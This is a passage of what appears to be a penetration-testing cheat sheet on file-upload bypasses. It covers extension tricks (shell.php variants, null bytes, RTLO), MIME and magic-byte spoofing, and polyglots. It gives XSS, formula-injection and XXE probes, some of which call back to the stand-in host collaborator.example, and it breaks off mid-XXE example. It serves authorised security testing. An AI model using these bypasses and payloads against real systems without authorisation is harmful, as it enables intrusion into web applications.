+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>.asmx
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>.ascx
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>.config
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>.cer
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>.asa
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>.soap
+</span></code></pre></div>
+<h3 id="jsp-java">JSP / Java</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>.jsp
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>.jspx
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>.jsw
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>.jsv
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>.jspf
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>.do
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>.action
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>.actions
+</span></code></pre></div>
+<h3 id="perl-cgi">Perl / CGI</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>.pl
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>.pm
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>.cgi
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>.lib
+</span></code></pre></div>
+<h3 id="coldfusion">ColdFusion</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>.cfm
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>.cfml
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>.cfc
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>.dbm
+</span></code></pre></div>
+<h3 id="node-javascript">Node / JavaScript</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>.js
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>.json
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>.node
+</span></code></pre></div>
+<h3 id="client-side-parser-relevant">Client-Side / Parser-Relevant</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>.html
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>.htm
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>.svg
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>.xml
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>.xhtml
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>.mht
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>.swf
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>.csv
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>.xls
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>.xlsx
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>.docx
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>.pdf
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>.zip
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>tar
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>tar.gz
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>7z
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>avi
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>mp4
+</span></code></pre></div>
+<hr />
+<h2 id="extension-bypass">Extension Bypass</h2>
+<h3 id="double-extension">Double Extension</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>shell.jpg.php
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>shell.png.php
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>shell.gif.php
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>shell.pdf.php
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>shell.php.jpg
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>shell.php.png
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>shell.php.gif
+</span></code></pre></div>
+<h3 id="case-variation">Case Variation</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>shell.pHp
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>shell.PHP
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>shell.PhP5
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>shell.PHTML
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>shell.PhAr
+</span></code></pre></div>
+<h3 id="trailing-dot-space">Trailing Dot / Space</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>shell.php.
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>shell.php..
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>shell.php...
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>shell.php%20
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>shell.php%2e
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>shell.php%2e%20
+</span></code></pre></div>
+<h3 id="null-byte-legacy">Null Byte Legacy</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>shell.php%00.jpg
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>shell.php%00.png
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>shell.php\x00.jpg
+</span></code></pre></div>
+<h3 id="slash-path-confusion">Slash / Path Confusion</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>shell.php/
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>shell.php/.
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>shell.php/./
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>shell.php%2f
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>shell.php%5c
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>shell.j%2fsp
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>shell.j%5csp
+</span></code></pre></div>
+<h3 id="newline-crlf">Newline / CRLF</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>shell.php%0a.jpg
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>shell.php%0d%0a.jpg
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>shell.php%09.jpg
+</span></code></pre></div>
+<h3 id="rtlo-filename-trick">RTLO Filename Trick</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>name.%E2%80%AEphp.jpg
+</span></code></pre></div>
+<p>Visual idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>name.gpj.php
+</span></code></pre></div>
+<h3 id="long-filename-truncation">Long Filename Truncation</h3>
+<p>Useful when the backend truncates filenames after validation.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python3<span class="w"> </span>-<span class="w"> </span><span class="s">&lt;&lt;&#39;PY&#39;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="s">print(&quot;A&quot; * 240 + &quot;.php.jpg&quot;)</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="s">PY</span>
+</span></code></pre></div>
+<p>Test variants:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>AAAAAAAA...[240]...AAAA.php.jpg
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>AAAAAAAA...[240]...AAAA.jsp.png
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>AAAAAAAA...[240]...AAAA.aspx.gif
+</span></code></pre></div>
+<hr />
+<h2 id="mime-content-type-bypass">MIME / Content-Type Bypass</h2>
+<p>Some applications trust the multipart <code>Content-Type</code> header.</p>
+<p>Try changing only the file part Content-Type:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="err">Content-Type: image/png</span>
+</span></code></pre></div>
+<p>Common values:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>image/png
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>image/jpeg
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>image/gif
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>text/plain
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>application/octet-stream
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>application/pdf
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>multipart/form-data
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>application/x-php
+</span></code></pre></div>
+<p>Burp workflow:</p>
+<ol>
+<li>Send upload request to Repeater.</li>
+<li>Keep filename dangerous.</li>
+<li>Change only the file part <code>Content-Type</code>.</li>
+<li>Compare response.</li>
+<li>If accepted, visit uploaded path.</li>
+<li>Check whether server executes or downloads the file.</li>
+</ol>
+<hr />
+<h2 id="magic-byte-bypass">Magic Byte Bypass</h2>
+<p>Some applications check only the first bytes of the file.</p>
+<h3 id="gif">GIF</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>GIF89a
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>upload_probe_73921
+</span></code></pre></div>
+<h3 id="png">PNG</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x89PNG\r\n\x1a\nupload_probe_73921&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.png
+</span></code></pre></div>
+<h3 id="jpeg">JPEG</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\xff\xd8\xff\xe0upload_probe_73921&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.jpg
+</span></code></pre></div>
+<h3 id="pdf">PDF</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>%PDF-1.3
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>upload_probe_73921
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>%%EOF
+</span></code></pre></div>
+<p>Test idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>valid magic bytes + dangerous extension
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>valid extension + dangerous content
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>valid magic bytes + dangerous content + dangerous extension
+</span></code></pre></div>
+<hr />
+<h2 id="polyglot-ideas">Polyglot Ideas</h2>
+<p>A polyglot file is valid enough for one parser while still carrying payload content for another context.</p>
+<p>Common targets:</p>
+<table>
+<thead>
+<tr>
+<th>Polyglot</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GIF + PHP</td>
+<td>Image header check bypass</td>
+</tr>
+<tr>
+<td>PNG + PHP</td>
+<td>Image upload with weak magic-byte checks</td>
+</tr>
+<tr>
+<td>JPEG + PHP metadata</td>
+<td>EXIF/comment payload</td>
+</tr>
+<tr>
+<td>SVG + JavaScript</td>
+<td>Stored XSS / SSRF / XML behavior</td>
+</tr>
+<tr>
+<td>PDF + JavaScript/HTML-like content</td>
+<td>Client-side or parser behavior</td>
+</tr>
+<tr>
+<td>ZIP + PHP</td>
+<td>Archive extraction / parser confusion</td>
+</tr>
+<tr>
+<td>DOCX/XLSX + XML</td>
+<td>XXE or macro-adjacent workflows</td>
+</tr>
+</tbody>
+</table>
+<p>Harmless marker example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>GIF89a
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>&lt;?php echo &quot;upload_probe_73921&quot;; ?&gt;
+</span></code></pre></div>
+<p>Use server-side payloads only when the engagement scope explicitly allows code execution testing.</p>
+<hr />
+<h2 id="image-metadata-payloads">Image Metadata Payloads</h2>
+<p>Check whether metadata survives upload processing.</p>
+<h3 id="add-exif-comment">Add EXIF Comment</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s2">&quot;upload_probe_73921&quot;</span><span class="w"> </span>image.jpg
+</span></code></pre></div>
+<h3 id="read-metadata-back">Read Metadata Back</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>exiftool<span class="w"> </span>uploaded.jpg
+</span></code></pre></div>
+<p>Useful if:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>metadata is rendered in HTML
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>metadata is stored in database
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>metadata is copied into thumbnails
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>metadata reaches admin panel
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>metadata reaches PDF/export
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>metadata is later included by backend logic
+</span></code></pre></div>
+<hr />
+<h2 id="svg-upload-testing">SVG Upload Testing</h2>
+<p>SVG is high-value because it is XML-based and often rendered by browsers or parsed server-side.</p>
+<h3 id="basic-svg-marker">Basic SVG Marker</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;20&quot;</span><span class="nt">&gt;</span>upload_probe_73921<span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<h3 id="svg-script-probe">SVG Script Probe</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">  </span><span class="nt">&lt;script&gt;</span>alert(document.domain)<span class="nt">&lt;/script&gt;</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<h3 id="svg-external-reference-probe">SVG External Reference Probe</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="w">  </span><span class="nt">&lt;image</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;https://collaborator.example/upload_probe_73921.png&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>stored XSS
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>admin-panel XSS
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>server-side fetch
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>PDF conversion callback
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>image proxy callback
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>XML parser errors
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>metadata extraction behavior
+</span></code></pre></div>
+<hr />
+<h2 id="html-upload-testing">HTML Upload Testing</h2>
+<p>If <code>.html</code> or <code>.htm</code> is accepted and served inline, test stored client-side execution.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="cp">&lt;!doctype html&gt;</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>upload_probe_73921<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Interesting filenames:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>probe.html
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>probe.htm
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>probe.xhtml
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>probe.svg
+</span></code></pre></div>
+<p>Check whether the uploaded file is served with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>text/html
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>image/svg+xml
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>application/xhtml+xml
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>text/plain
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>application/octet-stream
+</span></code></pre></div>
+<hr />
+<h2 id="csv-formula-injection-uploads">CSV / Formula Injection Uploads</h2>
+<p>Useful when uploaded CSV/XLSX files are opened by staff or exported later.</p>
+<p>Probe values:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>=1+1
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>=HYPERLINK(&quot;https://collaborator.example/csv_probe&quot;,&quot;click&quot;)
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>+1+1
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>-1+1
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>@SUM(1,1)
+</span></code></pre></div>
+<p>OAST-style probe:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>=WEBSERVICE(&quot;https://collaborator.example/csv_probe&quot;)
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>admin export
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>back-office spreadsheet processing
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>import error preview
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>data normalization
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>formula preservation
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>formula execution when opened
+</span></code></pre></div>
+<hr />
+<h2 id="xml-xxe-uploads">XML / XXE Uploads</h2>
+<p>If XML upload is accepted or office documents are parsed server-side, test XML behavior.</p>
+<h3 id="harmless-xml-marker">Harmless XML Marker</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="nt">&lt;root&gt;</span>upload_probe_73921<span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<h3 id="oast-xxe-probe">OAST XXE Probe</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;https://collaborator.example/xxe_probe&quot;&gt;</span>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>]&gt;
